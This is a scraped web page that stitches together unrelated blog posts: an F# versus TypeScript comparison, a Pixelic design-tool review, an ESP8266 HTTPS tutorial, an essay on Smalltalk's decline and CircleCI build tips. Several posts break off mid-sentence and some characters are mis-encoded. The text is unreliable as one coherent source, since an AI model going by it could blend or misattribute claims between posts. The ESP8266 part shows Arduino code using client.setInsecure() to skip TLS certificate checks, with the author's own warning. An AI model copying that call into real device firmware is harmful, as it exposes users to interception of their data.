    <p>While there are many UI libraries available today to build modern web apps, the number of programming languages that compile to JavaScript has also increased in recent years. Here is a quick take on F# and TypeScript.</p>
    
    <h2>Preface</h2>
<p>Although I did focus on mobile apps in the last years, I've spent the first decade or so of my career concatenating strings, also known as web development. So I think I might know a thing or two about how things work there.</p>
<p>However, as I watched the latest hype cycles in the JavaScript universe from the sidelines, I do not have many preferences when choosing "the right" technology stack. Except for one thing. I know for sure that I do not want to build serious software with JavaScript again, except when it acts as a compilation target for a more capable programming language.</p>
<p>So I did take a look at a couple of potential candidates: <a href="https://elm-lang.org/">Elm</a>, <a href="https://reasonml.org/">Reason</a>, <a href="https://www.typescriptlang.org/">TypeScript</a>, and <a href="https://fsharp.org/">F#</a>.</p>
<h2>Shortlist</h2>
<p>While I respect Elm and Reason, the overall experience seemed very close to web development with F#. Which can also be used for server-side tasks (even code-sharing between client and server is possible). So out of those four, F# and TypeScript are the most serious candidates for me. Sorry Elm. Sorry Reason.</p>
<h3>F#</h3>
<p>Since finally <a href="https://thomasbandt.com/who-cares-about-functional-programming">crossing the chasm</a> in 2017, I am a big fan of the language. As a long-time C# developer, it brought back the joy in programming to me. Making a case for using it in production at a larger scale project would intrigue me.</p>
<p>Interestingly, F# today is considered a language targeting two platforms: .NET and JavaScript. That is made possible through <a href="https://fable.io/">Fable</a>, "a compiler powered by Babel designed to make F# a first-class citizen of the JavaScript ecosystem" â€“ which sounds promising, doesn't it.</p>
<h3>TypeScript</h3>
<p>When Microsoft announced <a href="https://www.typescriptlang.org/">TypeScript</a> back in 2012, tooling was poor and excitement limited. It needed a significant player in the JavaScript world, Angular, to pick it up, to gain momentum. Today it is so widely used that I consider it the de facto standard for modern web development.</p>
<p>Its success is driven by a powerful type system plus the fact that it is similar enough to JavaScript to keep the learning curve relatively flat. Besides support for immutable data structures, I do not miss much of what I would expect from a modern programming language.</p>
<h2>A Small Case Study</h2>
<p>Now, how to make an informed decision that is not solely based on gut feelings? Good question. I decided to <a href="https://github.com/aspnetde/typesafe-spa">conduct a small case study</a>, which I designed to explore three different options to build a type-safe single page application:</p>
<ol>
<li><a href="https://github.com/aspnetde/typesafe-spa#elmish--feliz">F# + Elmish + Feliz</a></li>
<li><a href="https://github.com/aspnetde/typesafe-spa#react-function-components--feliz">F# + React Function Components + Feliz</a></li>
<li><a href="https://github.com/aspnetde/typesafe-spa#react-function-components--feliz">TypeScript + React</a></li>
</ol>
<p>In particular, I wanted to find answers to the following questions:</p>
<ol>
<li>How are parent-child relationships handled?</li>
<li>How much boilerplate code needs to be written?</li>
<li>How much guidance and support provides the compiler?</li>
<li>How maintainable, aka scalable, does the approach appear to be?</li>
</ol>
<p>The answers to those questions have already been covered in a <a href="https://thomasbandt.com/scaling-model-view-update">separate post</a>. Summary: Going with React components, either with F# or TypeScript, will make you write less code. Whereas choosing MVU (with F# + Elmish) may provide more safeguards through an architecture that is easy to understand and harder to produce errors in.</p>
<p>The bottom line is: Technically, all three approaches are valid, each of them has different strengths and weaknesses. So I cannot recommend one over the other. But I can introduce some more things to consider when making that choice.</p>
<h2>More Things To Consider</h2>
<h3>Language Qualities</h3>
<p>Code written in F# for me more often than not is concise, easy to write, and even more comfortable to read, containing only very few noisy elements. I sometimes sit in front of my computer and just look at F# code, enjoying its beauty. Seriously, that's probably what sets it apart from most other languages I've had the chance to work with. And it brings literally back the joy in programming to me. That's a factor that cannot be stressed enough, in my opinion. I firmly believe that many bored or almost burned out, but very seasoned developers could quickly be sold on it and "flipped."</p>
<p>Whereas TypeScript certainly has different qualities. I like how it integrates with the JavaScript world, offering its type system's help where wanted. But allowing at the same time developers to keep writing their code in the JS style they are used to. It seems to walk the line perfectly fine between the strengths of a statically-typed language and some flexibility and freedom, e.g., through supporting duck-typing. So while I personally am not a big fan of curly braces and semicolons anymore, TypeScript surely provides an enjoyable developer experience as well.</p>
<h3>Vendor Support</h3>
<p>TypeScript receives a lot of attention, not only from Microsoft but industry-wide. I don't see a sign that its development might slow down in the foreseeable future.</p>
<p>Similarily, F# has always been supported by Microsoft since its inception, and a (small) team is actively working on it. So there is no reason to worry about the future of the language itself.</p>
<p>However, while TypeScript is the whole package of compiler plus language, F#'s web story is a bit different. It relies on Fable as the F# to JavaScript compiler. And Fable is a complex operation which, right now, depends on only a few people's willingness to continue to work on it in their spare time (also see "bus factor" below).</p>
<h3>Tooling</h3>
<p>The tooling support for TypeScript is just great. For example, it integrates well in Visual Studio Code and is supported by many other editors and IDEs. Several of them are commercially supported.</p>
<p>The same is actually true for F#. Visual Studio (on Windows and macOS), <a href="https://www.jetbrains.com/rider/">Jetbrains Rider</a> (on Windows, macOS, and Linux) and <a href="https://ionide.io/">Ionide</a> (on all three platforms as well) support it.</p>
<h3>Ecosystem</h3>
<p>For TypeScript, a large amount of JavaScript packages are supported by the community. At the time of writing, there are 6,892 packages supported alone through the <a href="https://github.com/DefinitelyTyped/DefinitelyTyped">DefinitelyTyped</a> project.</p>
<p>Whereas the situation for Fable and F# is not that bright at the moment. There is support for a few essential players, e.g., React and Electron. But if you want to use a small random library, you most likely have to create (and maintain!) those bindings by yourself. Which is not a really complicated task â€“ but one that steals time, which could otherwise be spent working on your own project. And if some of the maintainers of the existing bindings lose interest in them, there is a big chance you will inherit them sooner or later (again, see bus factor).</p>
<h3>Bus Factor</h3>
<p>The sheer number of stakeholders makes TypeScript a safe bet for most things, e.g., tooling or library support. It's not only backed and actively developed by Microsoft, but also used by major web frameworks like Angular (Google) and Vue, or at least officially supported (React, Facebook). But it's not only the impressive number of large players. The community also consists of a large number of individual contributors.</p>
<p>Fable, on the other hand, has a small but active community of contributors and a few companies that are backing it (e.g., through <a href="https://safe-stack.github.io/">SAFE Stack</a>). However, the key drivers of the whole ecosystem are only a dozen or so people who move the entire platform forward in their spare time.</p>
<p>I personally see the chance of reaching the tipping point where the ecosystem might be able to grow faster â€“ but that's totally subjective and possibly more wishful thinking than reality.</p>
<h3>The Pit Of Success</h3>
<p>As <a href="https://blog.codinghorror.com/falling-into-the-pit-of-success/">described by Jeff Atwood</a>:</p>
<blockquote>
<p>The Pit of Success: in stark contrast to a summit, a peak, or a journey across a desert to find victory through many trials and surprises, we want our customers to simply fall into winning practices by using our platform and frameworks. To the extent that we make it easy to get into trouble we fail.</p>
</blockquote>
<p>While TypeScript is a tool that integrates smoothly in the JS ecosystem, F# and Fable run on top of it. When using Elmish, JS is the eventual compilation target, and React is the execution layer on which the actual F# application is running without many external dependencies. Given this and the high robustness of the F# compiler plus the reliable guidance by the MVU architecture, it makes Fable and F# a poster child of the idea of the pit of success.</p>
<p>Whereas with TypeScript, every component might look different, depending on its author's taste and level of experience.</p>
<h3>Talent Pool</h3>
<p>There is no doubt that TypeScript is one of the <a href="https://insights.stackoverflow.com/survey/2020#most-loved-dreaded-and-wanted">most loved programming languages</a> on earth at the time of writing. So it should not be complicated to find TypeScript developers or train any developer on using it.</p>
<p>While not at all being that popular, I think the story for F# might be more rewarding. There is a large pool of .NET developers who mainly use C# today. A language that adopted and continues to borrow more and more features from F# and that is getting more and more bloated on the way. As already mentioned: I believe that many talented and seasoned C# developers can be trained to use F#. This will make programming more enjoyable to them again and allow you to leverage their experience on the .NET platform.</p>
<h2>Conclusion</h2>
<p>As you can see, there are valid arguments for both TypeScript and F#. While I can and will not pick a winner at this point, I hope some information in this post can help you to make an informed decision yourself. I am sure it will be the right one! ;-)</p>

                    <p>A few weeks ago, our team adopted a tool called <a href="https://www.pixelic.io/">Pixelic</a>, a UX collaboration tool that integrates with Figma and Slack to make design feedback, task management, and documentation more accessible.</p><figure><img src="https://blog.pixelic.io/content/images/2020/07/Screenshot-2020-07-01-14.57.58.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/07/Screenshot-2020-07-01-14.57.58.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/07/Screenshot-2020-07-01-14.57.58.png 1000w, https://blog.pixelic.io/content/images/size/w1600/2020/07/Screenshot-2020-07-01-14.57.58.png 1600w, https://blog.pixelic.io/content/images/size/w2400/2020/07/Screenshot-2020-07-01-14.57.58.png 2400w" sizes="(min-width: 1200px) 1200px"><figcaption>Pixelic's Figma frames screen.</figcaption></figure><p>I observed our team go through multiple design iterations using the tool and thought it’d be helpful for other designers and teams to get a perspective on how Pixelic makes the UX design process much easier.</p><p>Here are three topics that I’ll be sharing:</p><ol><li>When do you use Pixelic? A use case for teams</li><li>Tracking history and product backlog through Pixelic</li><li>Creating a shared understanding via Pixelic and its efficacy</li></ol><h2 id="when-do-you-use-pixelic">When do you use Pixelic?</h2><figure><img src="https://blog.pixelic.io/content/images/2020/06/106546009_877858009376814_471483989897433073_n.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/06/106546009_877858009376814_471483989897433073_n.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/06/106546009_877858009376814_471483989897433073_n.png 1000w, https://blog.pixelic.io/content/images/2020/06/106546009_877858009376814_471483989897433073_n.png 1566w" sizes="(min-width: 720px) 720px"><figcaption>This process chart describes our team’s current UX design process from ideation to retrospectives.</figcaption></figure><p>Rows colored in yellow (from rough sketch, discussion/UX policies, to design QA) were design phases where Pixelic made our collaboration easier.</p><h2 id="improvement-points">Improvement Points</h2><p>Pixelic launched its first open beta in May 2020, so there were areas for improvement and a few features still in development.</p><p>We needed a wiki-like feature where we could take notes, store UX specifications, and share them with product and engineering teams. Notion and Zeplin were our go-to-tools for this during the “Understanding” phase in our design process.</p><p>It was pretty difficult to switch from Notion/Zeplin right away, but we hope to see more improvements in Pixelic’s documentation features.</p><h2 id="where-pixelic-came-in-handy-for-our-team">Where Pixelic came in handy for our team</h2><p>We realized that Pixelic could be a source of truth for the communication log as it integrates with Figma and Slack. This came in handy during our Design QA phase.</p><p>Before Pixelic, we had to manually create QA documents in Notion and share it with our engineering and product partners. We would copy and paste several links, upload screenshots, write thorough descriptions on the acceptance criteria.</p><figure><img src="https://blog.pixelic.io/content/images/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png 1000w, https://blog.pixelic.io/content/images/size/w1600/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png 1600w, https://blog.pixelic.io/content/images/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png 1942w" sizes="(min-width: 720px) 720px"><figcaption>Sample Notion screen. There was so much to fill out in Notion to make our design QA work.</figcaption></figure><p>With Pixelic, we’re now able to just import Figma frames into the tool and write acceptance criteria using Pixelic’s annotation feature. There’s no need for us to take screenshots, copy/paste Zeplin links, and communicate with our engineering partners to create QA tasks. Pixelic did them all automatically.</p><h3 id="1-tracking-design-task-backlog-history">1) Tracking design task backlog history</h3><p>Not having an optimal product development and design process often made our workflow less productive. It looked something like this:</p><ol><li>Designer “A” and Developer “B” review design and exchange feedback in Slack</li><li>They then add the outcome (often design tasks) of the meeting to a Jira project Kanban board under the backlog</li><li>Product manager “C” notices the new task, but doesn’t have any context as to why it was created. So “C” requests designers “A” &amp; “B” to explain.</li><li>Teammates “A” &amp; “B” stop what they were doing, and loop C in so “C” could understand the context</li></ol><p>If only we had a place where the product manager (“C”) can read/understand the context behind a task or decision without asking the designers “A” and “B,” they would have kept their focus on doing more important tasks. We became less productive as a team due to redundant meetings and discussion. (Meetings are seldom productive!)</p><p>We found that Pixelic was a perfect tool for this pain point. Here are a few ways Pixelic helped us:</p><h3 id="2-pixelic-automates-task-creation-process">2) Pixelic automates task creation process</h3><p>It’s pretty difficult to keeping track of action items during design reviews. Someone has to take charge of translating discussions into actionable tasks and adding them to a project board while others continue discussing.</p><p>But with Pixelic, all you need to do is click the “taskify” button on each comment. Even during meetings, you can convert comments into tasks while viewing the design, so there’s no “context-switching cost” incurred. Pixelic lets you convert comments into tasks without diverging from the discussion.</p><figure><img src="https://blog.pixelic.io/content/images/2020/06/taskify.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/06/taskify.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/06/taskify.png 1000w, https://blog.pixelic.io/content/images/size/w1600/2020/06/taskify.png 1600w, https://blog.pixelic.io/content/images/size/w2400/2020/06/taskify.png 2400w" sizes="(min-width: 1200px) 1200px"><figcaption>"Taskify" button on each comment on Pixelic converts respective comments into tasks</figcaption></figure><p>Traditionally, teams switch between communication apps (e.g., Slack) and task management apps (e.g., Jira, Notion, etc.) to go back and forth, discussing and adding tasks.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Fetching or posting data to the internet is one of the core tasks of an IoT device. Doing so over HTTP is implemented quite well in the default ESP8266 Arduino libraries, but for HTTPS requests things are more difficult. In this post I will discuss the most common approaches used by the community, and develop my own method to do arbitrary HTTPS requests in a secure way. This method will not require any specific certificates or fingerprints to be manually coded in the application.</p><p>HTTPS if a method to do a HTTP request over a TLS (formerly SSL) connection. By doing so, the data that is sent back and forth between your computer and the server is encrypted and protected. The good news is that this protocol can be used with the ESP8266 with the <span>WiFiClientSecure</span> class. The bad news is that the common methods to do so have some big disadvantages.</p><p>First I will show the two most common approaches, and next I will describe a generic solution to their problems.</p><h3>A word about certificates</h3><p>Before diving into the details I will briefly explain the basic principles of secure HTTPS requests in layman's terms.</p><p>Basically, every website has a certificate. This certificate is issued by somebody, who is called a certification authority (CA). Each CA certificate can be issued by another CA which leads to the so called certificate chain. In the picture the chain is 3 certificates long, but in reality the length of the chain can be anything.</p><p>A certificate chain. Image from Wikipedia</p><p>The top level certificate is called a root certificate. This certificate is self-signed, which means that it can be trusted inherently. This is because only a few organisations can issue root certificates, and these are trusted to not offer fake or wrong certificates.</p><p>When you do a HTTPS request to a website from your browser, the browser will look at the certificate for the website, and validating if the certificate is indeed issued by its parent. This can be done because each certificate is signed with the private key of the upstream certificate. An explanation for dummies on public and private keys work can be found <a href="https://medium.com/@vrypan/explaining-public-key-cryptography-to-non-geeks-f0994b3c2d5" target="_blank" rel="noopener noreferrer">here<!-- --> <span><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg></span></a>.</p><p>When it is verified that the certificate is indeed issued by a trusted root CA issuer, it is verified that the domain in the certicate is the same as the actual domain. If that is true, we know that the server is who it claims to be, and a secure connection can be started . </p><p>These trusted root certificates are actually stored as part of your browser to be able to validate all other certificates. Each OS or browser stores a slightly different set of roughly 100-200 root certificates, which it knows can be trusted. This is called a certificate store, and this is exactly what I will apply on the ESP8266 later in this article. But first, let's start with the two most popular other approaches.</p><h3>Fingerprints - secure but annoying</h3><p>The method that is proposed in the official ESP8266 Arduino <a href="https://arduino-esp8266.readthedocs.io/en/latest/esp8266wifi/client-secure-examples.html" target="_blank" rel="noopener noreferrer">documentation<!-- --> <span><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg></span></a> is to extract the fingerprint of a site's certificate and store this in the code. The fingerprint is a hash of the certificate. Because it is very unlikely that a second certificate exists with the same hash, we know the website can be trusted if the hash is the same as the one we store.</p><pre><code>const char<span>*</span> host <span>=</span> <span>"https://api.github.com"</span><span>;</span>
const char<span>*</span> fingerpr <span>=</span> <span>"CF 05 98 89 CA FF 8E D8 5E 5C E0 C2 E4 F7 E6 C3 C7 50 DD 5C"</span><span>;</span>
            
WiFiClientSecure client<span>;</span>
client<span>.</span><span>connect</span><span>(</span>host<span>,</span> httpsPort<span>)</span><span>;</span>

<span>if</span> <span>(</span>client<span>.</span><span>verify</span><span>(</span>fingerpr<span>,</span> host<span>)</span><span>)</span> 
<span>{</span>  
    http<span>.</span><span>begin</span><span>(</span>client<span>,</span> host<span>)</span><span>;</span>

    <span>String</span> payload<span>;</span>
    <span>if</span> <span>(</span>http<span>.</span><span>GET</span><span>(</span><span>)</span> <span>==</span> HTTP_CODE_OK<span>)</span>    
        payload <span>=</span> http<span>.</span><span>getString</span><span>(</span><span>)</span><span>;</span>    
<span>}</span>
<span>else</span> 
<span>{</span>
  <span>Serial</span><span>.</span><span>println</span><span>(</span><span>"certificate doesn't match"</span><span>)</span><span>;</span>
<span>}</span></code></pre><p>This approach is simple because the certificate chain does not need to be validated, but has two main issues for me:</p><ol><li>The fingerprint needs to be extracted and stored manually for each page the ESP8266 needs to connect to.</li><li>An even bigger issue is that these fingerprints change roughly once a year when the certificate expires. This means that your program can break at any time and you manually need to update the fingerprint in your code.</li></ol><h3>client.setInsecure() - easy but unsafe</h3><p>You could argue that secure connections are overkill for your application. I would be the first to admit that I prefer a pragmatic solution where possible. Imagine that all you want to do with your ESP8266 is to fetch the weather from the internet and display it in some form. Personally I would not mind to do this in an insecure way, since there are no real dangers.</p><p>But imagine the ESP8266 is controlling the lock on your door or a 3D printer which can heat up and catch on fire. Or think of the case where you are transfering personal information to or from some site or API. In these cases it is better to be safe than sorry, and the method in this section should not be used. Nevertheless, I will show it here:</p><pre><code>const char<span>*</span> host <span>=</span> <span>"https://api.github.com"</span><span>;</span>
            
WiFiClientSecure client<span>;</span>
client<span>.</span><span>setInsecure</span><span>(</span><span>)</span><span>;</span> <span>//the magic line, use with caution</span>
client<span>.</span><span>connect</span><span>(</span>host<span>,</span> httpsPort<span>)</span><span>;</span>
  
http<span>.</span><span>begin</span><span>(</span>client<span>,</span> host<span>)</span><span>;</span>

<span>String</span> payload<span>;</span>
<span>if</span> <span>(</span>http<span>.</span><span>GET</span><span>(</span><span>)</span> <span>==</span> HTTP_CODE_OK<span>)</span>    
    payload <span>=</span> http<span>.</span><span>getString</span><span>(</span><span>)</span><span>;</span>    
</code></pre><p>So basically all you need to do is to add <span>client.setInsecure()</span> to your code and it will start the connection without validating the certificate. </p><h3>HTTPS requests with the IoT framework</h3><p>With that out of the way, we finally get to the implementation I have chosen instead for my ESP8266 IoT Framework, which is placed in the <span>fetch</span> class.</p><pre><code>const char<span>*</span> host <span>=</span> <span>"https://api.github.com"</span><span>;</span>            

<span>String</span> payload<span>;</span>
<span>if</span> <span>(</span>fetch<span>.</span><span>GET</span><span>(</span>host<span>)</span> <span>==</span> HTTP_CODE_OK<span>)</span>    
    payload <span>=</span> http<span>.</span><span>getString</span><span>(</span><span>)</span><span>;</span>    

fetch<span>.</span><span>clean</span><span>(</span><span>)</span><span>;</span>
</code></pre><p>Looks easy enough doesn't it ? So what happens behind the scenes? </p><p>Basically the same thing as in a typical Browser. The ESP8266 contains a full store of all the trusted root certificates in <abbr title="PROGMEM is part of the flash memory where read-only variables can be stored to reduce RAM usage.">PROGMEM</abbr> memory. This takes roughly ~170 kB of flash memory at the moment, which in my case can easily be missed. This certificate store is generated automatically on building the sofware, no manual steps required. This also means that you can do secure HTTPS requests to any URL (so you could even configure or change a URL after the build).</p><p>You might think, but hey! These certificates will expire too. And this is true. The only difference with the fingerprints is that the validity of root certificates is much longer, and can be over 20 years. Whereas the fingerprint for some services can change every few months.</p><p>As a starting point I found a great but hidden example in the ESP8266 Arduino <a href="https://github.com/esp8266/Arduino/tree/master/libraries/ESP8266WiFi/examples/BearSSL_CertStore" target="_blank" rel="noopener noreferrer">repo<!-- --> <span><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg></span></a>. This example contains a Python script that gets all the certificates from the Mozilla root certificate store and stores them as files. These files will then be uploaded to the <abbr title="SPIFFS is an abbreviation for 'Serial Peripheral Interface Flash File System', which is a way to store files on embedded systems.">SPIFFS</abbr> and used during HTTPS requests. I adapted this example to be able to store the certificates in <abbr title="PROGMEM is part of the flash memory where read-only variables can be stored to reduce RAM usage.">PROGMEM</abbr> instead.</p><h3>Generating a certificate store</h3><p>When a request is started, the <span>certStore</span> class will compare the hash of the certificate issuer with all the hashes of the stored root certificates. If there is a match, the correctness of the domain and other properties will be checked and the connection will be initialized.</p><p>In the default Arduino example these hashes for the stored certificates are generated in the <span>certStore</span> class. It seems more logical to me to do this directly in the Python script to save computing time on the ESP8266, so thats where I moved it. Furthermore I adapted the <span>certStore</span> class (<a href="https://github.com/maakbaas/esp8266-iot-framework/blob/master/src/certStore.cpp" target="_blank" rel="noopener noreferrer">GitHub<!-- --> <span><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg></span></a>) to read the information from my <abbr title="PROGMEM is part of the flash memory where read-only variables can be stored to reduce RAM usage.">PROGMEM</abbr> variables rather than the file system. </p><p>The final Python script to generate the certificate store is shown below.</p><pre><code><span>from</span> __future__ <span>import</span> print_function

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
								<p>I’ve been thinking about designing my own programming language for a long time. I’ve actually been keeping a lot of notes, and even throwing together some code when I can find time. My plan is to build something that takes inspiration from LISP, JavaScript and Smalltalk. I think there’s a niche to be filled. There are many new programming languages coming out lately, but most of them are statically typed and compiled ahead of time. The <a href="https://en.wikipedia.org/wiki/Dynamic_programming_language">dynamic languages</a> that do come out often don’t perform very well (see CPython, Ruby) or have poorly thought out&nbsp;semantics.</p>
<p>I’ve written a few&nbsp;blog posts pointing and laughing at perceived failures of JavaScript, but the truth is that programming language design is hard.&nbsp;There’s no limit to the complexity of the things you can build with programming code. No matter the design choices you make, no matter the language you design, there are bound&nbsp;to be some inconsistencies and weaknesses somewhere.&nbsp;I think that Smalltalk is a very inspiring programming language, revolutionary in many ways, but it’s also one that has gone extinct. It’s interesting, in my opinion, to ask ourselves why Python thrives but Smalltalk died.</p>
<p>Like LISP, Smalltalk implemented some interesting features which have influenced other languages (such as Java and JavaScript). Some nifty features of Smalltalk are really cool, but still aren’t implemented in any other language. For instance, Smalltalk had the ability to suspend running programs into a saved image, and resume execution later at the saved point. As you can imagine, this is extremely powerful and useful. Forget saving documents or saving games, just save the state of an entire program, no implementation effort required.</p>
<p>I found an interesting talk on YouTube titled “What Killed Smalltalk could Kill Ruby Too”:</p>
<p><span><iframe width="560" height="315" src="https://www.youtube.com/embed/YX3iRjKj7C0?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span></p>
<p>Robert Martin makes the case that one of the big weaknesses of Smalltalk is&nbsp;that it was just “too easy to make a mess”. Smalltalk was highly dynamic, and encouraged people to “monkey patch” things and do quick fixes/hacks.&nbsp;He also makes the point that Smalltalk just “didn’t play well with others”. When you think about it, Smalltalk had its own source control, IDE and GUI built into live images, living alongside your program. Smalltalk isn’t just a language, it’s an operating system and a way of life. It’s conflating things that would maybe be best left separate.</p>
<p>It seems to me that in some key areas, the&nbsp;Smalltalk creators placed their own radical ideas above everything else. They chose idealism over pragmatism. Smalltalk was a language created with a grandiose vision. It had some deeply rooted principles which didn’t necessarily work so well in practice, such as the idea that everything had to be an object, that the object metaphor should be applied everywhere, one size fits all.&nbsp;At the end of the day, programmers want to get things done and be productive. If the language design or implementation gets in the way of getting things done, people will leave. Pragmatism is key for a programming language to succeed.</p>
<p>Smalltalk was also designed with the idea that it should be easy to learn and intuitive. This has led its creators to have a heavy focus on graphical user interfaces.&nbsp;I watched an introduction to <a href="https://www.youtube.com/watch?v=Ox5P7QyL774">Self on YouTube</a>&nbsp;(Self is a direct descendent of Smalltalk) and saw the heavy emphasis on interacting with objects through UIs. The user interfaces showcased in this video are, in my opinion, horribly complex and unintuitive. Pretty much all of the interactions done through the UI would have been simpler and easier to understand if they had been done by writing one or two lines of code instead!</p>
<p>When you sit down and think about it for one second, you have to realize that programming doesn’t fundamentally have anything to do with graphical user interfaces. Yes, you can use programming code to create GUIs, but there is no reason that programming should have to involve GUIs and be tied to them. The metaphor of writing code has been extremely successful since the very beginning, and it probably makes more sense to the mathematical mind of a skilled programmer. Not everything has to have a visual metaphor. This is again a case of pushing some idealistic principle too far, in my opinion.</p>
<p>I believe that a lack of pragmatism is something that has killed many languages. Not just Smalltalk, but Scheme too. My first experience with Scheme involved trying and failing to install multiple Scheme distributions because I couldn’t get all the dependencies to work. Then, finally getting a Scheme compiler installed, and struggling to implement simple routines to parse text files, because Scheme doesn’t include&nbsp;the most basic string routines. The Scheme compiler I’d selected bragged that the code it produced was highly optimized, but once I finally managed to write my own string routines, I compiled my program, ran it, and it was dog slow.&nbsp;Parsing a one-megabyte CSV spreadsheet took over a minute. I ended up rewriting the code in Python. Why don’t more people code in Scheme? Because they try to realize their ideas in Scheme, and it just doesn’t quite work out.</p>

Here’s a run that took 4:30:</p><div><p><img src="https://images.ctfassets.net/zp9m00phuodm/36Mmhm3hvFEcn2v5k45OJ8/c9120c139df16150910a69a8a5388cbb/1wsSz9yROEXnMvvHSmIt5J83YIAsS90sJaiuidmI.png" alt="CircleCI: without a cache."></p></div><p>Without a cache (such as when the job is first run, or when the list of node modules that make up the cache is changed), it takes around three minutes to install all dependencies from scratch, and another 40 seconds to save those dependencies to the cache:</p><div><p><img src="https://images.ctfassets.net/zp9m00phuodm/7rhLcGIZiqLiOXPWaFowgQ/9c1139085b600e0151a3be12ca8d7588/16mAVWC6xAttEJckvXfz_6LOp7dcYRSMsxw0rZzQ.png" alt="CircleCI: with a cache."></p></div><p>This run time isn’t terrible, but it could be <strong>much</strong> better.</p><h2 id="accelerate-each-step">Accelerate each step</h2><p>With a little tinkering, almost every step in this job can be sped up. Let’s dive in:</p><h3 id="1-use-2nd-gen-convenience-images-for-quick-environment-spin-up">1. Use 2nd gen convenience images for quick environment spin up</h3><p>The “Spin Up Environment” step is responsible for creating the virtual environment in which your job will execute (hence “executor”). Pulling in an executor, in this example an entire Docker image, can be slow. Although you can specify a custom Docker image, CircleCI also provides <a target="_blank" rel="noopener noreferrer" href="https://circleci.com/docs/2.0/circleci-images/#next-generation-convenience-images">pre-made convenience images</a> that we have found to be very convenient.</p><p>CircleCI recently released a second-generation version of these convenience images, which promise faster spin-up times. The <a target="_blank" rel="noopener noreferrer" href="https://github.com/CircleCI-Public/cimg-base/blob/master/Dockerfile.template">cimg-base repository</a> documents everything that is installed in the base Docker Image. Because the convenience images are all built off of the same base image, they can cache very well <a target="_blank" rel="noopener noreferrer" href="https://circleci.com/blog/how-to-build-a-docker-image-on-circleci-2-0/">using Docker Layer Caching</a>.</p><p>In our example, the only change we need to make is to point to one of these new images in our <code>executors</code>. In our case, we can also remove our credentials used to access our private image:</p><div><pre><p><span>1</span><span>executors:</span></p><p><span>2</span><span>   ci-node:</span></p><p><span>3</span><span>     docker:</span></p><p><span>4</span><span></span><span>-     - image: 123456789.dkr.ecr.eu-west-1.amazonaws.com/ci-node:our5ha</span><span></span></p><p><span>5</span><span></span><span>+     - image: cimg/node:14.3</span><span></span></p><p><span>6</span><span> </span></p><p><span>7</span><span> workflows:</span></p><p><span>8</span><span>   main_workflow:</span></p><p><span>9</span><span>     jobs:</span></p><p><span>10</span><span></span><span>+      - jest-unit</span><span></span></p><p><span>11</span><span></span><span>-      - jest-unit:</span><span></span></p><p><span>12</span><span></span><span>-         # Give this job AWS credentials to access our private Docker images</span><span></span></p><p><span>13</span><span></span><span>-         context: dev-ctx</span></p></pre></div><p>The results are pretty dramatic when the cache hits:</p><div><p><img src="https://images.ctfassets.net/zp9m00phuodm/4ramSJxcaUSP3OekcYBkRK/9fac31c12fdcd24b12a2a0a66056c72e/1j-4V-pGdkkTL6bRMc4LkeRZqINrhDWebZzn8j9E.png" alt="CircleCI: with cache hits."></p></div><p>Even when the cache doesn’t hit, there are usually enough layers cached that spinning up the environment now takes less than 15 seconds (down from 30-50 seconds before).</p><p>Even more helpful than this speed, the new convenience images are Debian-based. This allows us to use Unix tools that our developers are familiar with, like the package manager <code>apt</code>, instead of the sometimes-confusing Alpine <code>apk</code> (Alpine does not include common tools like <code>bash</code> or <code>jq</code> by default).</p><h3 id="2-use-shallow-clones-for-swift-code-checkout">2. Use shallow clones for swift code checkout</h3><p>Repositories balloon over time, especially if you use a monorepo as we do. Even if the file size at HEAD is kept relatively small, <a target="_blank" rel="noopener noreferrer" href="https://stackoverflow.com/questions/5613345/how-to-shrink-the-git-folder">past file blobs can stick around in the .git folder</a>. One of the best ways to speed up <code>git clone</code> commands is to use a <a target="_blank" rel="noopener noreferrer" href="https://www.perforce.com/blog/vcs/git-beyond-basics-using-shallow-clones">shallow checkout</a>.</p><p>There are a few open-source <a target="_blank" rel="noopener noreferrer" href="https://circleci.com/docs/2.0/orb-intro/">CircleCI Orbs</a> that make this optimization easy to implement.

